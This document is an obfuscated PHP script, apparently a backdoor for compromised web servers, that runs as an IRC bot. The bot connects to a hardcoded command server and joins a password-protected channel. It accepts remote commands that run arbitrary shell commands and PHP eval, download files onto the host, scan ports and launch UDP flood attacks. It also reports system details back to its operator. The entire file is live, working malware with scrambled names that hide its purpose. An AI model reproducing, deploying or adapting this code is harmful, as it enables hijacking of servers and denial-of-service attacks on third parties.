<?php set_time_limit(0); error_reporting(0);  class QnQZBzwztBQBbkEhB {

 /* Z1CYb8nZyqdsiMVLLmET0rLLdvXL8S1XJtMLsZAQgE9ohVZS7tCXLezOzmqy5hlFBYgTOHAUbA8 */

 var $nwwhwenkQnnhBQZ = array("NHWqetNzTEZTQEbt"=>"gang.sexpil.net",
                     "QwNZ"=>"25343",
                     "TQkeH"=>"scary",
                     "wqNZhN"=>"13",
                     "KNKbQbN"=>"#wWw#",
                     "qTt"=>"scan",
                     "nNhTQBKkn"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "KbeWeKtwzq"=>".",
                     "EkbqTbhTQwN"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $users = array(); 

 /* Tfv6SYfZCS6UwawV5fwlgumzXJLyvdreiNb0BgQ3ZNOlOa7JguUnO7MCGn11qi6zV7qne7g3KVf */ function gYJDAMGp($host) 
 { 
    unset($this->users[$host]); 
 } function GdagJPJaASPav() 
 { 
    if(!($this->OIlXiXLUC = fsockopen($this->nwwhwenkQnnhBQZ['NHWqetNzTEZTQEbt'],$this->nwwhwenkQnnhBQZ['QwNZ'],$e,$s,30))) 
    $this->GdagJPJaASPav(); 
    $this->mGspyaSDYDgApPPjM();
    if(strlen($this->nwwhwenkQnnhBQZ['TQkeH'])>0) 
    $this->jdmjJpm("PASS ".$this->nwwhwenkQnnhBQZ['TQkeH']);
    $this->SVpJDAvjPGSMpsmJ();
    $this->DjyJGJvSsAgmYD();
 }

 /* oVcY2xIfbFREc5v3mDZMoX3B10IVAu0Pf3D7qcdsIVWKQhD3KtGZgzr7p0SQkJwqCZoT2rbAcXa */ function jdmjJpm($msg) 
 { 
    fwrite($this->OIlXiXLUC,"$msg\r\n"); 
 }function DjyJGJvSsAgmYD() 
 { 
    while(!feof($this->OIlXiXLUC)) 
    { 
       $this->buf = trim(fgets($this->OIlXiXLUC,512)); 
       $hKBqEqQnBeWBh = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->jdmjJpm("PONG :".substr($this->buf,6)); 
       } 
       if(isset($hKBqEqQnBeWBh[1]) && $hKBqEqQnBeWBh[1] =="004") 
       { 
          $this->jdmjJpm("MODE ".$this->nick." ".$this->nwwhwenkQnnhBQZ['']); 
          $this->jdmjJpm("JOIN ".$this->nwwhwenkQnnhBQZ['KNKbQbN']." ".$this->nwwhwenkQnnhBQZ['qTt']."");
          $this->SadAaD($this->nwwhwenkQnnhBQZ['KNKbQbN'],$this->nwwhwenkQnnhBQZ['qTt']);
          $this->AsddsGmSVaGdMMYdspA();
       } 
       if(isset($hKBqEqQnBeWBh[1]) && $hKBqEqQnBeWBh[1]=="433") 
       { 
          $this->SVpJDAvjPGSMpsmJ(); 
       } 
	/* T4EMFXiu4IM2YCLFNl13NRixJzy9CmalhEYMs77mFJfucQZQ2QKFyS37is7KE7WLCLoUJl7fVcz */
       if($this->buf != $old_buf) 
       { 
          $THQkenzHwzZqBe = array(); 
          $ioC = substr(strstr($this->buf," :"),2); 
          $Xxlx = explode(" ",$ioC); 
          $LOOCc = explode("!",$hKBqEqQnBeWBh[0]); 
          $oFXRLO = explode("@",$LOOCc[1]); 
          $oFXRLO = $oFXRLO[1]; 
          $LOOCc = substr($LOOCc[0],1); 
          $CCXFOxl = $hKBqEqQnBeWBh[0]; 
          if($Xxlx[0]==$this->LOOCc) 
          { 
           for($i=0;$i<count($Xxlx);$i++) 
              $THQkenzHwzZqBe[$i] = $Xxlx[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($Xxlx);$i++) 
              $THQkenzHwzZqBe[$i] = $Xxlx[$i]; 
          } 
          if(count($hKBqEqQnBeWBh)>2) 
          { 
             switch($hKBqEqQnBeWBh[1]) 
             { 
                case "QUIT": 
                   if($this->YSGmJGpmGVGy($CCXFOxl)) 
                   { 
                      $this->gYJDAMGp($CCXFOxl); 
                   } 
                break; 
                case "PART": 
                   if($this->YSGmJGpmGVGy($CCXFOxl)) 
                   { 
                      $this->gYJDAMGp($CCXFOxl); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->YSGmJGpmGVGy($CCXFOxl) && (md5($oFXRLO) == $this->nwwhwenkQnnhBQZ['EkbqTbhTQwN'] || $this->nwwhwenkQnnhBQZ['EkbqTbhTQwN'] == "*")) 
                   { 
                      if(substr($THQkenzHwzZqBe[0],0,1)==$this->nwwhwenkQnnhBQZ['KbeWeKtwzq']) 
                      { 
                         switch(substr($THQkenzHwzZqBe[0],1)) 
                         { 
                            case "user": 
                              if(md5($THQkenzHwzZqBe[1])==$this->nwwhwenkQnnhBQZ['nNhTQBKkn']) 
                              { 
                                 $this->AvVsJaPGD($CCXFOxl);
                              } 
                              else 
                              { 
                                 $this->ppdyDddMgp($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[\2Auth\2]: Foute password $LOOCc idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   } 
		     /* YToEL5ehtWar5toFXmszO4NzDZwILz8zim4Uh92BW2SRm7n9jFyYAcn32JCD8A2hNX2VWUmIN4p */
                   elseif($this->YSGmJGpmGVGy($CCXFOxl)) 
                   { 
                      if(substr($THQkenzHwzZqBe[0],0,1)==$this->nwwhwenkQnnhBQZ['KbeWeKtwzq']) 
                      { 
                         switch(substr($THQkenzHwzZqBe[0],1)) 
                         {                            case "dns": 
                               if(isset($THQkenzHwzZqBe[1])) 
                               { 
                                  $ip = explode(".",$THQkenzHwzZqBe[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[\2dns\2]: ".$THQkenzHwzZqBe[1]." => ".gethostbyaddr($THQkenzHwzZqBe[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[\2dns\2]: ".$THQkenzHwzZqBe[1]." => ".gethostbyname($THQkenzHwzZqBe[1])); 
                                  } 
                               } 
			    break;                            case "die": 
                               $this->jdmjJpm("QUIT :die command from $LOOCc");
                               fclose($this->OIlXiXLUC); 
                               exit;                            case "logout": 
                               $this->gYJDAMGp($CCXFOxl); 
                               $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[auth:]\00314 Je bent nu uitgelogt $LOOCc"); 
			    break;                            case "info":
				   $this->AsddsGmSVaGdMMYdspA();
			    break;                            case "pscan": 
                               if(count($THQkenzHwzZqBe) > 2) 
                               { 
                                  if(fsockopen($THQkenzHwzZqBe[1],$THQkenzHwzZqBe[2],$e,$s,15)) 
                                     $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[\2pscan\2]: ".$THQkenzHwzZqBe[1].":".$THQkenzHwzZqBe[2]." is \2open\2"); 
                                  else 
                                     $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[\2pscan\2]: ".$THQkenzHwzZqBe[1].":".$THQkenzHwzZqBe[2]." is \2closed\2"); 
                               } 
			    break;                            case "download": 
                               if(count($THQkenzHwzZqBe) > 2) 
                               { 
                                  if(!$fp = fopen($THQkenzHwzZqBe[2],"w")) 
                                  {  
                                     $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[download:]\00314 Kon bestand niet downloaden. Toestemming geweigerd."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($THQkenzHwzZqBe[1])) 
                                     { 
                                        $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[download:]\00314 Kan bestand \2".$THQkenzHwzZqBe[1]."\2 niet downloaden."); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[download:]\00314 Bestand \2".$THQkenzHwzZqBe[1]."\2 gedownload naar \2".$THQkenzHwzZqBe[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               }
                               else { $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[download:]\00314 Typ \".download http://your.host/file /tmp/file\""); }
			    break;                            case "popen": 
                               if(isset($THQkenzHwzZqBe[1])) 
                               { 
                                  $command = substr(strstr($ioC,$THQkenzHwzZqBe[0]),strlen($THQkenzHwzZqBe[0])+1); 
                                  $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[\2popen\2]: $command");
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               }  
			    break;                            case "restart": 
                               $this->jdmjJpm("QUIT :gerestart door $LOOCc");
                               fclose($this->OIlXiXLUC); 
                               $this->GdagJPJaASPav(); 
			    break;                            case "exec": 
                               $command = substr(strstr($ioC,$THQkenzHwzZqBe[0]),strlen($THQkenzHwzZqBe[0])+1); 
                               $exec = exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"      : ".trim($ret[$i])); 
			    break;                            case "system": 
                               $command = substr(strstr($ioC,$THQkenzHwzZqBe[0]),strlen($THQkenzHwzZqBe[0])+1); 
                               $exec = system($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"      : ".trim($ret[$i])); 
			    break;                            case "rndnick": 
                               $this->SVpJDAvjPGSMpsmJ(); 
			    break;                            case "udpflood": 
                               if(count($THQkenzHwzZqBe)>3) 
                               { 
                                  $this->dSpGpyvYpjmGyYVdsj($THQkenzHwzZqBe[1],$THQkenzHwzZqBe[2],$THQkenzHwzZqBe[3]); 
                               } 
			    break;                            case "eval":
                              $eval = eval(substr(strstr($ioC,$THQkenzHwzZqBe[1]),strlen($THQkenzHwzZqBe[1])));
			    break;                            case "passthru": 
                               $command = substr(strstr($ioC,$THQkenzHwzZqBe[0]),strlen($THQkenzHwzZqBe[0])+1); 

                               $exec = passthru($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"      : ".trim($ret[$i])); 
			    break;                            case "sexec":
                               $command = substr(strstr($ioC,$THQkenzHwzZqBe[0]),strlen($THQkenzHwzZqBe[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"      : ".trim($ret[$i])); 
			    break;                            case "raw":
                               $this->jdmjJpm(strstr($ioC,$THQkenzHwzZqBe[1])); 
			    break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->GdagJPJaASPav(); 
 } function ppdyDddMgp($to,$msg)
 {
    $this->jdmjJpm("NOTICE $to :$msg");
 } function mGspyaSDYDgApPPjM() {
  $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $size = strlen($chars);
  for($i=0;$i<6;$i++) {
	$str .= $chars[rand(0,$size-1)];
  }
  if(php_uname() == "") { $uname = "---"; } else { $uname = php_uname(); }
  $this->jdmjJpm("USER ".$str."-gc 127.0.0.1 localhost :".$uname."");
 } function YSGmJGpmGVGy($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 } function AvVsJaPGD($host) 
 { 
    $this->users[$host] = true; 
 } function dSpGpyvYpjmGyYVdsj($host,$packetsize,$time) {
	$this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[\2UdpFlood Started!\2]"); 
	$packet = "";
	for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
	$timei = time();
	$i = 0;
	while(time()-$timei < $time) {
		$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
      	fwrite($fp,$packet);
       	fclose($fp);
		$i++;
	}
	$env = $i * $packetsize;
	$env = $env / 1048576;
	$vel = $env / $time;
	$vel = round($vel);
	$env = round($env);
	$this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");
 } function sSGPvPmgyYA($to,$msg)
 {
    $this->jdmjJpm("PRIVMSG $to :$msg");
 } function SVpJDAvjPGSMpsmJ() {
  $chars = 'abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789';	
  $size = strlen($chars);
  for($i=0;$i<$this->nwwhwenkQnnhBQZ['wqNZhN'];$i++) {
	$str .= $chars[rand(0,$size-1)];
  }
  $this->jdmjJpm("NICK ".$str."");
 } function AsddsGmSVaGdMMYdspA() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "\0034ON\003"; }
    else { $safemode = "\0039OFF\003"; }

	$unme = php_uname();
	if($unme == "") { $mname = "\00315---\003"; }
	else { $mname = "\00315".$unme."\003"; }
		 
	 $url = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 $pth = "\00315".getcwd()."\003";
		  
	$pthh =  getcwd()."";
	$OliLfRCFuC = fileperms("$pthh");

	if (($OliLfRCFuC & 0xC000) == 0xC000) { $licuuXFUuUF = 's';
	} elseif (($OliLfRCFuC & 0xA000) == 0xA000) { $licuuXFUuUF = 'l';
	} elseif (($OliLfRCFuC & 0x8000) == 0x8000) { $licuuXFUuUF = '-';
	} elseif (($OliLfRCFuC & 0x6000) == 0x6000) { $licuuXFUuUF = 'b';
	} elseif (($OliLfRCFuC & 0x4000) == 0x4000) { $licuuXFUuUF = 'd';
	} elseif (($OliLfRCFuC & 0x2000) == 0x2000) { $licuuXFUuUF = 'c';
	} elseif (($OliLfRCFuC & 0x1000) == 0x1000) { $licuuXFUuUF = 'p';
	} else { $licuuXFUuUF = 'u'; }

	// Owner
	$licuuXFUuUF .= (($OliLfRCFuC & 0x0100) ? 'r' : '-');
	$licuuXFUuUF .= (($OliLfRCFuC & 0x0080) ? 'w' : '-');
	$licuuXFUuUF .= (($OliLfRCFuC & 0x0040) ?	(($OliLfRCFuC & 0x0800) ? 's' : 'x' ) :	(($OliLfRCFuC & 0x0800) ? 'S' : '-'));
	// Group
	$licuuXFUuUF .= (($OliLfRCFuC & 0x0020) ? 'r' : '-');
	$licuuXFUuUF .= (($OliLfRCFuC & 0x0010) ? 'w' : '-');
	$licuuXFUuUF .= (($OliLfRCFuC & 0x0008) ?	(($OliLfRCFuC & 0x0400) ? 's' : 'x' ) :	(($OliLfRCFuC & 0x0400) ? 'S' : '-'));
	// World
	$licuuXFUuUF .= (($OliLfRCFuC & 0x0004) ? 'r' : '-');
	$licuuXFUuUF .= (($OliLfRCFuC & 0x0002) ? 'w' : '-');
	$licuuXFUuUF .= (($OliLfRCFuC & 0x0001) ?	(($OliLfRCFuC & 0x0200) ? 't' : 'x' ) :	(($OliLfRCFuC & 0x0200) ? 'T' : '-'));
			
	$rghts = "\00315".$licuuXFUuUF."\003";

	$this->sSGPvPmgyYA($this->nwwhwenkQnnhBQZ['KNKbQbN'],"\00314[SAFE:\003\2 $safemode\2\00314]\00315 $url \00314[pwd:]\00315 $pth \00314(\003$rghts\00314) [uname:]\00315 $mname");
 } function SadAaD($chan,$key=NULL) 
 { 
    $this->jdmjJpm("JOIN $chan $key"); 
 }}
$lXiCxoLO = new QnQZBzwztBQBbkEhB;
$lXiCxoLO->GdagJPJaASPav(); ?>